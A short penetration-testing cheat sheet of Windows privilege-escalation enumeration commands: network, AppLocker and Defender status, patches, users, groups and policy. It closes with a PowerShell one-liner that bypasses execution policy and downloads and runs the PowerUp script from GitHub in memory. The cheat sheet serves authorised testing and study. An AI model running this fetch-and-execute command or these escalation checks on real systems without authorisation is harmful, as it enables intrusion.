https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

# Network Information
```powershell
ipconfig /all
arp -a
route print
```

# Enumerate Protection
```powershell
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Test Applocker Policy
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

# List Blocked Executable Files by AppLocker
```powershell
[xml]$policy = Get-AppLockerPolicy -Effective -Xml
$policy.AppLockerPolicy.RuleCollection | ForEach-Object {
    $Type = $_.Type
    $_.GetElementsByTagName("FilePathCondition") | ForEach-Object {
        [PSCustomObject]@{
            "Rule Type" = $Type
            "File / Path"  = $_.Path
            "Action"     = $_.ParentNode.ParentNode.Action
            "Name"        = $_.ParentNode.ParentNode.Name
        }
    }
} | Format-Table -AutoSize
```

# System Information
```powershell
tasklist /svc

# Show Environment
set

# System Information
systeminfo

# Kernel Update
wmic qfe
Get-HotFix | ft -AutoSize

# Installed Programs
wmic product get name
Get-WmiObject -Class Win32_Product |  select Name, Version

# Display Running Process
netstat -ano
```

# User and Groups
```powershell
# User and Groups Enumeration
query user
net user
net localgroup

# Current User
echo %USERNAME%

# Current User privileged
whoami /priv

# Group Enumeration
whoami /groups
net localgroup

# Group Membership
net localgroup administrators
```

# Enumerate Policy
```powershell
net accounts
```

# PowerUp
```powershell
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks


```

